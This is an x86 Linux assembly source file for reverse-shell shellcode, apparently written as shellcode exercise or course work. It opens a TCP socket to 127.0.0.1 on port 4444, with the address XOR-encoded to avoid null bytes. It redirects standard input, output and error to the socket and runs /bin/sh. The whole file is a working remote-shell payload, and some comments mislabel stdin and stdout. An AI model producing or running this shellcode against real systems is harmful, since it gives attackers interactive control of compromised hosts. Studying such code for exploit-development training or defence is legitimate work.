; shell_reverse_tcp.nasm
; Author: Michael Norris

global _start

section .text
_start:
    ; clear registers
    xor ebx, ebx        ; clears EBX
    mul ebx             ; clears EAX and EDX

    ; Create a TCP Socket
    ; int socket(int domain, int type, int protocol);
    ; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    push edx            ; 0
    push 0x1            ; 1 = SOCK_STREAM
    push 0x2            ; 2 = AF_INET
    ; int socketcall(int call, unsigned long *args);
    mov ecx, esp        ; *args
    inc bl              ; 1 = sys_socket
    mov al, 0x66        ; socketcall
    int 0x80            ; returns int sockfd in eax
    
    ; Store int sockfd in ebx;
    ; reused in connect socketcall as 3 = sys_connect 
    ; reused in dup2 as int oldfd = sockfd = 3
    mov ebx, eax
    
    ; Create an IP Address Pointer
    ; const char* ip = "127.0.0.1";
    mov edi, 0xffffffff ; 255.255.255.255
    mov ecx, 0xfeffff80 ; 128.255.255.254
    xor ecx, edi        ; 0x0100007f = 127.0.0.1

    ; Create an IP Socket Address Structure
    ; struct sockaddr_in addr;
    push ecx            ; inet_aton("127.0.0.1", &addr.sin_addr);
    push word 0x5c11    ; addr.sin_port = htons(4444);
    push word 0x2       ; addr.sin_family = 2 = AF_INET;
    mov ecx, esp        ; pointer to struct sockaddr_in addr;

    ; Connect TCP Socket to IP Socket Address Structure
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    push 0x10           ; 16 = sizeof(addr)
    push ecx            ; (struct sockaddr *)&addr
    push ebx            ; sockfd
    ; int socketcall(int call, unsigned long *args);
    mov ecx, esp        ; *args
    mov al, 0x66        ; socketcall   
    int 0x80            ; returns 0 in eax

    ; Direct Connection Socket Output
    ; int dup2(int oldfd, int newfd);
    ; dup2(sockfd, 0);
    mov ecx, edx        ; 0 = STDOUT
    mov al, 0x3f        ; dup2
    int 0x80
    ; dup2(sockfd, 1);
    inc cl              ; 1 = STDIN
    mov al, 0x3f        ; dup2
    int 0x80
    ; dup2(sockfd, 2);
    inc cl              ; 2 = STDERROR
    mov al, 0x3f        ; dup2
    int 0x80

    ; Execute Program
    ; int execve(const char *pathname, char *const argv[], char *const envp[]);
    ; execve("/bin/sh", NULL, NULL);
    push edx            ; delimiting NULL for pathname; EDX is NULL for envp[]
    push 0x68732f2f     ; //sh
    push 0x6e69622f     ; /bin
    mov ecx, edx        ; NULL for argv[]
    mov ebx, esp        ; pointer to pathname
    mov al, 0xb         ; execve
    int 0x80
